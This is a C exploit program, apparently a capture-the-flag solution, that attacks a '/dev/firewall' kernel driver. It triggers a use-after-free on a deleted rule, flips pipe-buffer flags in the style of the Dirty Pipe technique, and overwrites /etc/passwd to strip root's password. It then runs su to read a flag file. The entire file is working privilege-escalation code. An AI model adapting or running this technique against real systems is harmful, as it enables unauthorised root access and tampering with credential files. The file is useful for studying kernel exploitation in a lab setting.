#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>


#define CMD_ADD_RULE       0x41004601UL
#define CMD_DELETE_RULE    0x40044602UL
#define CMD_EDIT_RULE      0x44184603UL
#define CMD_SHOW_RULE      0x84184604UL

#define RULE_DATA_SIZE     0x400
#define PIPE_FLAG          0x10
#define PIPE_BUF_OFFSET    24
#define PIPE_FLAG_SIZE     0x10
#define PASSWD_OFFSET      4

struct rule {
    uint64_t index;
    uint64_t position;
    uint64_t size;
    char data[RULE_DATA_SIZE];
};


static int firewall_fd = -1;


static void die(const char *msg)
{
    perror(msg);
    exit(EXIT_FAILURE);
}

static void check_syscall(long ret, const char *name)
{
    if (ret < 0)
        die(name);
}

static void dump_u64(const uint64_t *buffer, size_t size)
{
    size_t count = size / sizeof(*buffer);

    for (size_t i = 0; i + 1 < count; i += 2) {
        printf("0x%016" PRIx64 "\t0x%016" PRIx64 "\n",
               buffer[i],
               buffer[i + 1]);
    }
}


static size_t add_rule(const char *rule_data)
{
    long ret = ioctl(firewall_fd, CMD_ADD_RULE, rule_data);

    check_syscall(ret, "ioctl(CMD_ADD_RULE)");

    printf("[+] rule %zu added\n", (size_t)ret);

    return (size_t)ret;
}

static void delete_rule(size_t index)
{
    check_syscall(
        ioctl(firewall_fd, CMD_DELETE_RULE, index),
        "ioctl(CMD_DELETE_RULE)"
    );
}

static uint64_t show_rule(uint64_t index, uint64_t position, uint64_t size)
{
    struct rule rule = {
        .index = index,
        .position = position,
        .size = size,
    };

    memset(rule.data, 0, sizeof(rule.data));

    check_syscall(
        ioctl(firewall_fd, CMD_SHOW_RULE, &rule),
        "ioctl(CMD_SHOW_RULE)"
    );

    dump_u64((uint64_t *)rule.data, 0x20);

    return ((uint64_t *)rule.data)[3];
}

static void edit_rule(uint64_t index,
                      uint64_t position,
                      uint64_t size,
                      uint32_t flags)
{
    struct rule rule = {
        .index = index,
        .position = position,
        .size = size,
    };

    memcpy(rule.data, &flags, sizeof(flags));

    check_syscall(
        ioctl(firewall_fd, CMD_EDIT_RULE, &rule),
        "ioctl(CMD_EDIT_RULE)"
    );
}


static void exploit(void)
{
    firewall_fd = open("/dev/firewall", O_RDWR);
    check_syscall(firewall_fd, "open(/dev/firewall)");

    size_t rule_index =
        add_rule("192.168.1.1 255.255.255.0 1024 0");

    delete_rule(rule_index);

    int pipefd[2];

    check_syscall(
        pipe(pipefd),
        "pipe"
    );

    int passwd_fd = open("/etc/passwd", O_RDONLY);
    check_syscall(passwd_fd, "open(/etc/passwd)");

    loff_t offset = PASSWD_OFFSET;

    ssize_t nread = splice(
        passwd_fd,
        &offset,
        pipefd[1],
        NULL,
        1,
        0
    );

    if (nread < 0)
        die("splice");

    if (nread != 1) {
        fprintf(stderr,
                "[-] splice: expected 1 byte, got %zd\n",
                nread);
        exit(EXIT_FAILURE);
    }

    /* Leak pipe buffer flags */
    uint64_t flags =
        show_rule(0, 0, RULE_DATA_SIZE);

    flags |= PIPE_FLAG;
    edit_rule(
        0,
        PIPE_BUF_OFFSET,
        PIPE_FLAG_SIZE,
        (uint32_t)flags
    );

    const char payload[] =
        ":0:0:root:/root:/bin/sh\n"
        "ctf:x:1000:1000::/home/ctf:/bin/sh\n";

    ssize_t written = write(
        pipefd[1],
        payload,
        sizeof(payload) - 1
    );

    if (written < 0)
        die("write");

    if ((size_t)written != sizeof(payload) - 1) {
        fprintf(stderr,
                "[-] short write: expected %zu, got %zd\n",
                sizeof(payload) - 1,
                written);
        exit(EXIT_FAILURE);
    }

    close(passwd_fd);
    close(pipefd[0]);
    close(pipefd[1]);

    if (execl(
            "/bin/su",
            "su",
            "root",
            "-c",
            "cat /flag.txt",
            NULL
        ) < 0) {
        die("execl(/bin/su)");
    }
}


int main(void)
{
    puts("[+] starting exploit");

    exploit();

    return EXIT_SUCCESS;
}
